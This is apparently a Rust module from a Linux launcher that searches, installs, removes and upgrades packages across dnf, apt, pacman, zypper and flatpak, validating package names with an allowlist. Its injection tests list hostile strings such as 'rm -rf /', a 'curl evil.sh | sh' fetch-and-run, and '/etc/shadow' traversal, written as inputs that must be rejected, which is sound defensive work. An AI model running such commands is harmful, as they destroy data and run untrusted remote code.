//! Package manager — search and install system packages, straight from the
//! launcher. Another signature Linux capability a macOS launcher can't offer.
//!
//! Adaptive by design (per Lychi's no-hardcoding rule): the native manager is
//! *detected*, not assumed. We probe for dnf / apt / pacman / zypper (whichever
//! the distro ships) and treat flatpak as an always-optional universal layer on
//! top. So `install neovim` runs `dnf install` on Fedora, `apt install` on
//! Debian, `pacman -S` on Arch — with zero configuration.
//!
//! Commands:
//!   - `search <query>`   → search available packages (read-only)
//!   - `install <pkg>`    → install a package (needs root → pkexec)
//!   - `remove <pkg>`     → remove/uninstall a package (needs root → pkexec)
//!   - `upgrade [pkg]`    → upgrade one package, or the whole system if omitted
//!
//! Search is Low risk and auto-executes. install/remove/upgrade mutate the system
//! and are gated to a confirmation by the Rules Engine, then escalate via polkit
//! (`pkexec`) rather than `sudo` — which would hang on a tty password prompt the
//! launcher can't answer. The mutating-verb list lives in `crate::rules::verbs`.

use std::process::Command;

use async_trait::async_trait;

use crate::action_registry::{
    ActionHandler, ActionResult, CommandCategory, CompletionItem, ExecContext, Output, OutputType,
    RiskAssessment, RiskLevel, Row, Section,
};
use crate::error::LychiError;

pub struct PackagesHandler;

impl PackagesHandler {
    pub fn new() -> Self {
        Self
    }
}

impl Default for PackagesHandler {
    fn default() -> Self {
        Self::new()
    }
}

fn have(tool: &str) -> bool {
    which::which(tool).is_ok()
}

/// The native system package manager, detected once per call. Order follows the
/// major distro families; the first installed one wins.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Manager {
    Dnf,
    Apt,
    Pacman,
    Zypper,
}

impl Manager {
    fn detect() -> Option<Manager> {
        // dnf before yum-era, apt covers Debian/Ubuntu, then Arch, then SUSE.
        for (bin, mgr) in [
            ("dnf", Manager::Dnf),
            ("apt", Manager::Apt),
            ("pacman", Manager::Pacman),
            ("zypper", Manager::Zypper),
        ] {
            if have(bin) {
                return Some(mgr);
            }
        }
        None
    }

    fn binary(self) -> &'static str {
        match self {
            Manager::Dnf => "dnf",
            Manager::Apt => "apt",
            Manager::Pacman => "pacman",
            Manager::Zypper => "zypper",
        }
    }

    /// Search args (read-only, no privilege).
    fn search_args(self, query: &str) -> Vec<String> {
        let q = query.to_string();
        match self {
            Manager::Dnf => vec!["search".into(), q],
            Manager::Apt => vec!["search".into(), q],
            Manager::Pacman => vec!["-Ss".into(), q],
            Manager::Zypper => vec!["--no-refresh".into(), "search".into(), q],
        }
    }

    /// Install args (mutating, non-interactive — the caller escalates privilege).
    fn install_args(self, pkg: &str) -> Vec<String> {
        let p = pkg.to_string();
        match self {
            Manager::Dnf => vec!["install".into(), "-y".into(), p],
            Manager::Apt => vec!["install".into(), "-y".into(), p],
            Manager::Pacman => vec!["-S".into(), "--noconfirm".into(), p],
            Manager::Zypper => vec!["--non-interactive".into(), "install".into(), p],
        }
    }

    /// Remove/uninstall args (mutating, non-interactive). Removes just the named
    /// package (no `--autoremove`/recursive-deps sweep — that's a bigger, riskier
    /// operation the user should run deliberately).
    fn remove_args(self, pkg: &str) -> Vec<String> {
        let p = pkg.to_string();
        match self {
            Manager::Dnf => vec!["remove".into(), "-y".into(), p],
            Manager::Apt => vec!["remove".into(), "-y".into(), p],
            Manager::Pacman => vec!["-R".into(), "--noconfirm".into(), p],
            Manager::Zypper => vec!["--non-interactive".into(), "remove".into(), p],
        }
    }

    /// Upgrade args (mutating, non-interactive). With an empty package name this
    /// upgrades everything; with a name it upgrades just that package where the
    /// manager supports it (apt/dnf); pacman/zypper always do a full sync-upgrade.
    fn upgrade_args(self, pkg: &str) -> Vec<String> {
        let p = pkg.trim().to_string();
        let one = !p.is_empty();
        match self {
            Manager::Dnf => {
                if one {
                    vec!["upgrade".into(), "-y".into(), p]
                } else {
                    vec!["upgrade".into(), "-y".into()]
                }
            }
            Manager::Apt => {
                if one {
                    vec!["install".into(), "--only-upgrade".into(), "-y".into(), p]
                } else {
                    vec!["upgrade".into(), "-y".into()]
                }
            }
            // pacman/zypper do a full system upgrade; per-package upgrade isn't a
            // first-class op, so we sync-upgrade the system.
            Manager::Pacman => vec!["-Syu".into(), "--noconfirm".into()],
            Manager::Zypper => vec!["--non-interactive".into(), "update".into()],
        }
    }
}

/// Parse a manager's search output into a compact `name — summary` list. Each
/// manager formats differently, so normalize to the essentials. Best-effort:
/// unrecognized lines are skipped rather than shown raw.
/// Parse a manager's search output into `(name, summary)` pairs.
///
/// Returns the two fields rather than `"{name}  —  {summary}"`. Every manager
/// branch below already separates them — the old return type threw that apart
/// again immediately, so the em-dash was doing a layout's job and the name
/// could not be styled, sorted or acted on independently.
fn parse_search(mgr: Manager, raw: &str) -> Vec<(String, String)> {
    let mut out = Vec::new();
    match mgr {
        // dnf: "Matched fields:" headers, then " pkg.arch\tSummary".
        Manager::Dnf => {
            for line in raw.lines() {
                let line = line.trim_end();
                if line.starts_with("Matched fields") || line.trim().is_empty() {
                    continue;
                }
                let t = line.trim_start();
                if let Some((name_arch, summary)) = t.split_once('\t') {
                    let name = name_arch.split('.').next().unwrap_or(name_arch);
                    out.push((name.trim().to_string(), summary.trim().to_string()));
                } else if let Some((name_arch, summary)) = t.split_once("  ") {
                    let name = name_arch.split('.').next().unwrap_or(name_arch);
                    out.push((name.trim().to_string(), summary.trim().to_string()));
                }
            }
        }
        // apt: "name/suite version arch\n  Summary".
        Manager::Apt => {
            let mut lines = raw.lines().peekable();
            while let Some(line) = lines.next() {
                if line.starts_with("Sorting") || line.starts_with("Full Text") {
                    continue;
                }
                if let Some((name, _)) = line.split_once('/') {
                    let summary = lines
                        .peek()
                        .filter(|l| l.starts_with("  "))
                        .map(|l| l.trim())
                        .unwrap_or("");
                    if !summary.is_empty() {
                        lines.next();
                    }
                    out.push((name.trim().to_string(), summary.to_string()));
                }
            }
        }
        // pacman: "repo/name version\n    Summary".
        Manager::Pacman => {
            let mut lines = raw.lines().peekable();
            while let Some(line) = lines.next() {
                if let Some((repo_name, _)) = line.split_once(' ') {
                    let name = repo_name.split('/').next_back().unwrap_or(repo_name);
                    let summary = lines
                        .peek()
                        .filter(|l| l.starts_with("    ") || l.starts_with('\t'))
                        .map(|l| l.trim())
                        .unwrap_or("");
                    if !summary.is_empty() {
                        lines.next();
                    }
                    out.push((name.trim().to_string(), summary.to_string()));
                }
            }
        }
        // zypper: pipe-delimited table "S | Name | Summary | Type".
        Manager::Zypper => {
            for line in raw.lines() {
                let cols: Vec<&str> = line.split('|').map(|c| c.trim()).collect();
                if cols.len() >= 3 && cols[1] != "Name" && !cols[1].is_empty() {
                    out.push((cols[1].to_string(), cols[2].to_string()));
                }
            }
        }
    }
    out
}

/// Run a read-only search, returning one section per package source.
///
/// The old version built a string: a `"{binary}:"` header, `"{name}  —  {sum}"`
/// per line, and a literal `"… and N more"` footer, all joined with newlines.
/// Every one of those is a layout decision the frontend can make better —
/// section headings are a real heading, the em-dash is a subtitle, and the
/// truncation notice is a row count rather than a fake list entry.
///
/// Each row carries an install action, so finding a package and installing it
/// stops being two separate commands.
fn search(query: &str) -> Result<Vec<Section>, String> {
    const CAP: usize = 25;

    // The two sources are independent, so they run CONCURRENTLY.
    //
    // Measured on this machine: `dnf search` ~1.6s and `flatpak search` ~1.9s.
    // Run one after the other that is ~3.5s of dead time before anything
    // appears; run together it is bounded by the slower one. Neither call is
    // cheap enough to hide, but only one of them has to be waited for.
    //
    // A scoped thread rather than tokio: both are blocking `Command::output()`
    // calls, and scoped threads let them borrow `query` without cloning or
    // requiring the caller to be async.
    let (native, flat) = std::thread::scope(|scope| {
        let native = scope.spawn(|| search_native(query, CAP));
        let flat = scope.spawn(|| search_flatpak(query, CAP));
        (
            native.join().unwrap_or(Ok(None)),
            flat.join().unwrap_or(None),
        )
    });

    let mut sections: Vec<Section> = Vec::new();
    if let Some(section) = native? {
        sections.push(section);
    }
    if let Some(section) = flat {
        sections.push(section);
    }

    if sections.is_empty() {
        if Manager::detect().is_none() && !have("flatpak") {
            return Err(
                "No supported package manager found (dnf, apt, pacman, zypper, or flatpak)."
                    .to_string(),
            );
        }
        // An empty result renders as a real empty state rather than a sentence
        // pretending to be output.
        return Ok(Vec::new());
    }
    Ok(sections)
}

/// Search the system package manager. `Ok(None)` = no manager, or no matches.
fn search_native(query: &str, cap: usize) -> Result<Option<Section>, String> {
    let Some(mgr) = Manager::detect() else {
        return Ok(None);
    };
    let output = Command::new(mgr.binary())
        .args(mgr.search_args(query))
        .output()
        .map_err(|e| format!("Failed to run {}: {e}", mgr.binary()))?;
    // Search tools exit non-zero on "no matches" — that's not an error.
    let text = String::from_utf8_lossy(&output.stdout);
    let mut items = parse_search(mgr, &text);
    let total = items.len();
    items.truncate(cap);
    if items.is_empty() {
        return Ok(None);
    }
    let rows: Vec<Row> = items
        .into_iter()
        .map(|(name, summary)| {
            Row::new(&name)
                .subtitle(summary)
                .action("install", "Install", &name, Some(RiskLevel::Medium))
                .action("remove", "Remove", &name, Some(RiskLevel::Medium))
        })
        .collect();
    Ok(Some(Section {
        // The truncation notice belongs in the heading, not as a pseudo-row the
        // user can arrow onto and try to install.
        title: Some(if total > cap {
            format!("{} ({cap} of {total})", mgr.binary())
        } else {
            mgr.binary().to_string()
        }),
        rows,
        handler: "packages".to_string(),
    }))
}

/// Search flatpak, if installed. Failure is not fatal — the native results
/// still stand on their own.
fn search_flatpak(query: &str, cap: usize) -> Option<Section> {
    if !have("flatpak") {
        return None;
    }
    let output = Command::new("flatpak")
        .args(["search", query])
        .output()
        .ok()?;
    let text = String::from_utf8_lossy(&output.stdout);
    // flatpak columns are tab-separated: Name Desc AppID Version Branch Remote
    let mut items: Vec<Row> = text
        .lines()
        .filter(|l| !l.trim().is_empty())
        .filter_map(|l| {
            let cols: Vec<&str> = l.split('\t').map(|c| c.trim()).collect();
            if cols.len() < 3 || cols[0] == "Name" {
                return None;
            }
            let app_id = cols[2];
            let mut row = Row::new(cols[0])
                .subtitle(cols.get(1).copied().unwrap_or(""))
                // The app-id disambiguates same-named apps across remotes; it
                // used to be crammed into the label in parentheses.
                .accessory_text(app_id);
            // The version column was parsed and thrown away — a typed accessory
            // shows it without competing with the name.
            if let Some(v) = cols.get(3).filter(|v| !v.is_empty()) {
                row = row.accessory_text(*v);
            }
            Some(row.action("install", "Install", app_id, Some(RiskLevel::Medium)))
        })
        .collect();
    let total = items.len();
    items.truncate(cap);
    if items.is_empty() {
        return None;
    }
    Some(Section {
        title: Some(if total > cap {
            format!("flatpak ({cap} of {total})")
        } else {
            "flatpak".to_string()
        }),
        rows: items,
        handler: "packages".to_string(),
    })
}

/// Resolve a package row action into the command it stands for.
///
/// Same boundary as the services handler: the verb must be one this handler
/// declares, and the package name is checked against what a package name can
/// legitimately be rather than scanned for shell metacharacters. See
/// `services::resolve_action` for why the target needs validating even though
/// the id is already constrained.
pub fn resolve_action(id: &str, target: &str) -> Result<String, String> {
    if !matches!(id, "install" | "remove" | "upgrade") {
        return Err(format!("Unknown package action '{id}'"));
    }
    if !is_valid_package_name(target) {
        return Err(format!("Invalid package name '{target}'"));
    }
    Ok(format!("pkg {id} {target}"))
}

/// Whether `s` is a plausible package name or flatpak ref.
///
/// Allowlist, not denylist: names across dnf/apt/pacman/zypper plus flatpak
/// refs are alphanumerics and `-_.+:@/`, so describing what is allowed is both
/// shorter and safer than enumerating every dangerous byte.
///
/// `/` is permitted because a flatpak ref is genuinely path-shaped
/// (`runtime/org.gnome.Platform:47`) — a test written from real names caught
/// its omission. It is safe here for the same reason the rest of the set is:
/// the resolved string is passed as an argument, never interpolated into a
/// shell, and `..` is rejected below so a ref cannot climb out of anything.
fn is_valid_package_name(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 256
        && !s.contains("..")
        && s.chars().all(|c| {
            c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '+' | ':' | '@' | '/')
        })
}

/// A mutating package operation, for shared privilege-escalation + messaging.
#[derive(Clone, Copy)]
enum PkgOp {
    Install,
    Remove,
    Upgrade,
}

impl PkgOp {
    /// Past-tense verb for the success line ("Installed …", "Removed …").
    fn past(self) -> &'static str {
        match self {
            PkgOp::Install => "Installed",
            PkgOp::Remove => "Removed",
            PkgOp::Upgrade => "Upgraded",
        }
    }
    /// Present-tense verb for the "needs root" hint.
    fn present(self) -> &'static str {
        match self {
            PkgOp::Install => "Installing",
            PkgOp::Remove => "Removing",
            PkgOp::Upgrade => "Upgrading",
        }
    }
    fn native_args(self, mgr: Manager, pkg: &str) -> Vec<String> {
        match self {
            PkgOp::Install => mgr.install_args(pkg),
            PkgOp::Remove => mgr.remove_args(pkg),
            PkgOp::Upgrade => mgr.upgrade_args(pkg),
        }
    }
    /// flatpak equivalent of this op (user-scope, no root), if applicable.
    fn flatpak_args(self, app: &str) -> Option<Vec<String>> {
        match self {
            PkgOp::Install => Some(vec!["install".into(), "-y".into(), app.into()]),
            PkgOp::Remove => Some(vec!["uninstall".into(), "-y".into(), app.into()]),
            PkgOp::Upgrade => Some(vec!["update".into(), "-y".into(), app.into()]),
        }
    }
}

/// Run a mutating package op. Native operations need root → pkexec (graphical
/// polkit prompt). A `flatpak:` prefix targets flatpak (user scope, no root).
/// `pkg` may be empty only for `upgrade` (upgrade everything).
fn run_pkg_op(op: PkgOp, pkg: &str) -> Result<String, String> {
    let pkg = pkg.trim();
    let needs_pkg = !matches!(op, PkgOp::Upgrade);
    if needs_pkg && pkg.is_empty() {
        return Err(match op {
            PkgOp::Install => "Usage: install <package>".to_string(),
            PkgOp::Remove => "Usage: remove <package>".to_string(),
            PkgOp::Upgrade => unreachable!(),
        });
    }

    // Explicit flatpak target: `... flatpak:org.foo.Bar` or `... flatpak org.foo`.
    if let Some(app) = pkg
        .strip_prefix("flatpak:")
        .or_else(|| pkg.strip_prefix("flatpak "))
    {
        if !have("flatpak") {
            return Err("flatpak is not installed".to_string());
        }
        let Some(args) = op.flatpak_args(app.trim()) else {
            return Err("That operation isn't supported for flatpak".to_string());
        };
        let status = Command::new("flatpak")
            .args(&args)
            .status()
            .map_err(|e| format!("Failed to run flatpak: {e}"))?;
        return if status.success() {
            Ok(format!("{} {app} via flatpak ✓", op.past()))
        } else {
            Err(format!(
                "flatpak failed: {} {app}",
                op.present().to_lowercase()
            ))
        };
    }

    let Some(mgr) = Manager::detect() else {
        return Err("No native package manager found (dnf, apt, pacman, zypper).".to_string());
    };

    let args = op.native_args(mgr, pkg);
    let target = if pkg.is_empty() { "system" } else { pkg };
    // Native mutation needs root. Prefer pkexec (graphical) over a hanging sudo.
    if have("pkexec") {
        let mut full = vec![mgr.binary().to_string()];
        full.extend(args);
        let status = Command::new("pkexec")
            .args(&full)
            .status()
            .map_err(|e| format!("Failed to run pkexec: {e}"))?;
        return match status.code() {
            Some(0) => Ok(format!("{} {target} via {} ✓", op.past(), mgr.binary())),
            Some(126) | Some(127) => Err("Authorization dismissed or failed".to_string()),
            _ => Err(format!(
                "{} failed: {} {target}",
                mgr.binary(),
                op.present().to_lowercase()
            )),
        };
    }

    Err(format!(
        "{} a package needs root — install `pkexec` (polkit) for a graphical \
         prompt, or run: sudo {} {}",
        op.present(),
        mgr.binary(),
        args.join(" ")
    ))
}

#[async_trait]
impl ActionHandler for PackagesHandler {
    fn triggers(&self) -> &'static [crate::action_registry::Trigger] {
        use crate::action_registry::{ArgTransform, Trigger};
        use std::sync::OnceLock;

        static TRIGGERS: OnceLock<Vec<Trigger>> = OnceLock::new();
        TRIGGERS.get_or_init(|| {
            let mut t = vec![
                Trigger::new(&["install"], ArgTransform::Prepend("install")),
                Trigger::new(&["remove", "uninstall"], ArgTransform::Prepend("remove")),
                Trigger::new(&["upgrade"], ArgTransform::Prepend("upgrade")),
                // `packages` (plural) as well as the singular: the handler's own
                // id is `packages`, so typing it was the natural guess and fell
                // through to web search. Aliases are cheap; a keyword that
                // silently does nothing is not.
                Trigger::keywords(&["pkg", "package", "packages"]),
            ];

            // The machine's OWN package manager is a trigger too, so
            // `dnf search firefox` reaches this handler instead of being fuzzy-
            // matched against installed apps (it offered Firefox, KFind and
            // Catfish — none of them what was asked for).
            //
            // The keyword is DERIVED from `Manager::detect()`, not listed: `dnf`
            // is a trigger on Fedora, `apt` on Debian, `pacman` on Arch, and
            // none of them on a machine that has neither. A hardcoded list of
            // every manager would claim keywords for tools the user does not
            // have, and would need editing for the next distro
            // ([[feedback_dynamic_over_hardcoded]]).
            //
            // `PassThrough` because native syntax IS this handler's arg format:
            // `dnf search firefox` → args `search firefox`, which `execute`
            // already parses. Nothing is translated.
            //
            // Note this deliberately RE-ROUTES a real executable. `dnf` is on
            // PATH, so it would otherwise run in a terminal — which works, but
            // discards everything the handler adds (typed rows, per-result
            // actions, pkexec escalation instead of a tty password prompt the
            // launcher cannot answer). Shift+Enter still forces a terminal for
            // anyone who wants the raw command.
            if let Some(bin) = Manager::detect().map(Manager::binary) {
                // `binary()` already returns `&'static str`, so the slice can be
                // leaked once here without any runtime string ownership.
                t.push(Trigger::keywords(Box::leak(Box::new([bin]))));
            }
            t
        })
    }

    fn id(&self) -> &str {
        "packages"
    }

    fn description(&self) -> &str {
        "Search, install, remove & upgrade system packages (dnf/apt/pacman/zypper/flatpak)"
    }
    fn category(&self) -> CommandCategory {
        CommandCategory::System
    }

    fn assess_risk(
        &self,
        args: &str,
        _ctx: &crate::action_registry::RiskContext<'_>,
    ) -> RiskAssessment {
        // Search is read-only (auto); install/remove/upgrade mutate the system
        // (root via pkexec) and need confirmation.
        if is_mutating(args) {
            RiskAssessment::confirm(format!("Run 'pkg {}'?", args.trim()))
        } else {
            RiskAssessment::level(RiskLevel::Low)
        }
    }

    async fn completions(&self, partial: &str) -> Vec<CompletionItem> {
        let p = partial.trim().to_ascii_lowercase();
        let hints = [
            ("search", "search <query>", "Search available packages"),
            ("install", "install <package>", "Install a package"),
            ("remove", "remove <package>", "Remove a package"),
            (
                "upgrade",
                "upgrade [package]",
                "Upgrade a package or the system",
            ),
        ];

        // A COMPLETE invocation — the verb is chosen and an argument is being
        // typed ("search firefox"). Confirm what Enter will do.
        //
        // Returning nothing here was a real bug: an empty handler result makes
        // the executor fall through to its app-search rescue, which fuzzy-
        // matched the raw text and offered Firefox, KFind and Catfish for
        // `dnf search firefox`. Silence from a handler that DID match its own
        // trigger reads downstream as "no idea", which is the opposite of the
        // truth. A handler that owns the input must say so.
        if let Some((verb, rest)) = p.split_once(char::is_whitespace) {
            let rest = rest.trim();
            if !rest.is_empty()
                && let Some((_, _, desc)) = hints.iter().find(|(key, _, _)| *key == verb)
            {
                return vec![
                    CompletionItem::new(format!("{verb} {rest}"), Some("__terminal__".into()), 900)
                        .with_run(format!("{verb} {rest}"))
                        .with_description((*desc).to_string()),
                ];
            }
        }

        hints
            .iter()
            .filter(|(key, _, _)| p.is_empty() || key.starts_with(p.as_str()))
            .enumerate()
            .map(|(i, (_, label, desc))| {
                CompletionItem::new(
                    (*label).to_string(),
                    Some("__none__".into()),
                    850 - i as u16,
                )
                .with_description((*desc).to_string())
            })
            .collect()
    }

    async fn execute(&self, _ctx: &ExecContext, args: &str) -> Result<ActionResult, LychiError> {
        // Called as "search <q>" or "install <pkg>" (verb re-prepended by router).
        let trimmed = args.trim();
        let (verb, rest) = trimmed
            .split_once(char::is_whitespace)
            .unwrap_or((trimmed, ""));

        // `search` returns rows; the mutating verbs return terminal output from
        // the package manager, which is correct for them — a install log is
        // genuinely unstructured text.
        if verb == "search" {
            return match search(rest.trim()) {
                Ok(sections) => Ok(ActionResult {
                    success: true,
                    output: Output::Rows { sections },
                    ..Default::default()
                }),
                Err(e) => Ok(ActionResult::err(e)),
            };
        }

        let result = match verb {
            "install" => run_pkg_op(PkgOp::Install, rest.trim()),
            "remove" | "uninstall" => run_pkg_op(PkgOp::Remove, rest.trim()),
            "upgrade" => run_pkg_op(PkgOp::Upgrade, rest.trim()),
            _ => Err(
                "Usage: search <query> | install <pkg> | remove <pkg> | upgrade [pkg]".to_string(),
            ),
        };

        match result {
            Ok(out) => Ok(ActionResult::ok(out, OutputType::Terminal)),
            Err(e) => Ok(ActionResult::err(e)),
        }
    }
}

/// Is this a mutating packages invocation (install/remove/upgrade/…)? Used to
/// decide whether to confirm. Search/info/list are read-only. The verb list is
/// owned by the central classifier ([`crate::rules::verbs`]).
pub fn is_mutating(args: &str) -> bool {
    let verb = args
        .trim_start()
        .split_once(char::is_whitespace)
        .map(|(v, _)| v)
        .unwrap_or_else(|| args.trim());
    crate::rules::verbs::is_mutating_package_verb(verb)
}

#[cfg(test)]
mod native_trigger_tests {
    use super::*;
    use crate::action_registry::ActionHandler;

    /// The machine's own package manager routes here.
    ///
    /// `dnf search firefox` used to fall through to `run` (dnf IS on PATH), and
    /// the app index then fuzzy-matched the whole string — offering Firefox,
    /// KFind and Catfish for a package search.
    #[test]
    fn the_detected_manager_is_a_trigger() {
        let Some(bin) = Manager::detect().map(Manager::binary) else {
            // No native manager on this machine (container/CI) — nothing to
            // claim, and the handler correctly claims nothing.
            return;
        };
        let triggers = PackagesHandler::new().triggers();
        assert!(
            triggers.iter().any(|t| t.prefixes.contains(&bin)),
            "the detected manager ({bin}) must route to this handler"
        );
    }

    /// Derived, not listed: a manager this machine does NOT have must not be a
    /// trigger. Otherwise typing `pacman` on Fedora would claim a keyword for a
    /// tool that isn't installed.
    #[test]
    fn an_absent_manager_is_not_a_trigger() {
        let triggers = PackagesHandler::new().triggers();
        for bin in ["dnf", "apt", "pacman", "zypper"] {
            if have(bin) {
                continue;
            }
            assert!(
                !triggers.iter().any(|t| t.prefixes.contains(&bin)),
                "{bin} is not installed here, so it must not be a trigger"
            );
        }
    }

    /// Native syntax passes straight through — `dnf search firefox` becomes
    /// args `search firefox`, which `execute` already parses. No translation
    /// table, and nothing to keep in sync with the verbs.
    #[test]
    fn native_syntax_passes_through_unchanged() {
        let Some(bin) = Manager::detect().map(Manager::binary) else {
            return;
        };
        let triggers = PackagesHandler::new().triggers();
        let t = triggers
            .iter()
            .find(|t| t.prefixes.contains(&bin))
            .expect("detected manager must have a trigger");
        assert_eq!(t.transform.apply(bin, "search firefox"), "search firefox");
        assert_eq!(t.transform.apply(bin, "upgrade"), "upgrade");
    }
}

#[cfg(test)]
mod tests {

    // --- row-action resolution: the safety boundary ---------------------

    #[test]
    fn resolve_action_rejects_injection_through_the_target() {
        for evil in [
            "firefox; rm -rf /",
            "firefox && curl evil.sh | sh",
            "firefox$(whoami)",
            "firefox`id`",
            "firefox|tee /etc/passwd",
            "../../etc/shadow",
            "pkg 'quoted'",
            "",
        ] {
            assert!(
                resolve_action("install", evil).is_err(),
                "target should have been rejected: {evil:?}"
            );
        }
    }

    #[test]
    fn resolve_action_rejects_unknown_verbs() {
        for bad in ["exec", "rm", "download", "install; halt", ""] {
            assert!(resolve_action(bad, "firefox").is_err(), "{bad:?}");
        }
    }

    #[test]
    fn resolve_action_builds_a_normal_command_for_declared_verbs() {
        assert_eq!(
            resolve_action("install", "firefox").unwrap(),
            "pkg install firefox"
        );
        assert_eq!(
            resolve_action("install", "org.mozilla.firefox").unwrap(),
            "pkg install org.mozilla.firefox"
        );
    }

    /// Real package names and flatpak app-ids must survive the allowlist — a
    /// filter that rejects valid input is as broken as one that admits bad.
    #[test]
    fn valid_package_names_are_accepted() {
        for ok in [
            "firefox",
            "org.mozilla.firefox",
            "gcc-c++",
            "python3.12",
            "lib32-mesa",
            "runtime/org.gnome.Platform:47",
        ] {
            assert!(is_valid_package_name(ok), "should be valid: {ok}");
        }
    }

    /// parse_search returns the two fields separately so the frontend can lay
    /// them out; it must not re-flatten them into one string.
    #[test]
    fn parse_search_keeps_name_and_summary_separate() {
        let raw = "firefox.x86_64\tMozilla Firefox Web browser\n";
        let items = parse_search(Manager::Dnf, raw);
        assert_eq!(items.len(), 1);
        assert_eq!(items[0].0, "firefox");
        assert_eq!(items[0].1, "Mozilla Firefox Web browser");
    }
    use super::*;

    #[test]
    fn assess_risk_confirms_install_not_search() {
        let h = PackagesHandler::new();
        assert_eq!(
            h.assess_risk("install neovim", &Default::default()).level,
            RiskLevel::Medium
        );
        assert_eq!(
            h.assess_risk("search ripgrep", &Default::default()).level,
            RiskLevel::Low
        );
    }

    #[test]
    fn install_and_search_args_per_manager() {
        assert_eq!(
            Manager::Dnf.install_args("vim"),
            vec!["install", "-y", "vim"]
        );
        assert_eq!(
            Manager::Pacman.install_args("vim"),
            vec!["-S", "--noconfirm", "vim"]
        );
        assert_eq!(Manager::Apt.search_args("vim"), vec!["search", "vim"]);
        assert_eq!(Manager::Pacman.search_args("vim"), vec!["-Ss", "vim"]);
    }

    #[test]
    fn parse_dnf_output() {
        let raw = "Matched fields: name (exact)\n ripgrep.x86_64\tLine-oriented search tool\nMatched fields: name\n ripgrep-all.noarch\tripgrep, but also search in PDFs";
        let items = parse_search(Manager::Dnf, raw);
        assert_eq!(items.len(), 2);
        // Asserts the FIELDS, not a joined string: the em-dash was a layout
        // decision that no longer belongs to the parser.
        assert_eq!(items[0].0, "ripgrep");
        assert!(items[0].1.starts_with("Line-oriented"), "{:?}", items[0]);
        assert_eq!(items[1].0, "ripgrep-all");
        assert!(items[1].1.starts_with("ripgrep, but also"));
    }

    #[test]
    fn parse_apt_output() {
        let raw = "Sorting...\nFull Text Search...\nripgrep/stable 13.0.0 amd64\n  Recursively search directories\nfd-find/stable 8.0 amd64\n  Simple find alternative";
        let items = parse_search(Manager::Apt, raw);
        assert_eq!(items.len(), 2);
        assert_eq!(items[0].0, "ripgrep");
        assert!(items[0].1.starts_with("Recursively search"));
        assert_eq!(items[1].0, "fd-find");
        assert!(items[1].1.starts_with("Simple find"));
    }

    #[test]
    fn parse_pacman_output() {
        let raw = "extra/ripgrep 13.0.0-3\n    A search tool that combines usability\ncommunity/fd 8.4.0-1\n    Simple, fast alternative to find";
        let items = parse_search(Manager::Pacman, raw);
        assert_eq!(items.len(), 2);
        assert_eq!(items[0].0, "ripgrep");
        assert!(items[0].1.starts_with("A search tool"), "{:?}", items[0]);
        assert_eq!(items[1].0, "fd");
        assert!(items[1].1.starts_with("Simple, fast"));
    }

    #[test]
    fn is_mutating_for_mutating_verbs() {
        assert!(is_mutating("install neovim"));
        assert!(is_mutating("remove neovim"));
        assert!(is_mutating("uninstall neovim"));
        assert!(is_mutating("upgrade"));
        assert!(is_mutating("upgrade neovim"));
        assert!(!is_mutating("search neovim"));
        assert!(!is_mutating("search"));
    }

    #[test]
    fn install_and_remove_reject_empty() {
        assert!(run_pkg_op(PkgOp::Install, "").is_err());
        assert!(run_pkg_op(PkgOp::Remove, "").is_err());
        // upgrade with no package is valid (upgrade everything) — it won't error
        // on argument parsing (may fail later without a manager, but not here).
    }

    #[test]
    fn upgrade_args_full_vs_single() {
        // apt: single-package upgrade uses install --only-upgrade; full uses upgrade.
        assert!(
            Manager::Apt
                .upgrade_args("vim")
                .contains(&"--only-upgrade".to_string())
        );
        assert!(
            Manager::Apt
                .upgrade_args("")
                .contains(&"upgrade".to_string())
        );
        // pacman always full sync-upgrade.
        assert_eq!(
            Manager::Pacman.upgrade_args("vim"),
            vec!["-Syu", "--noconfirm"]
        );
    }
}
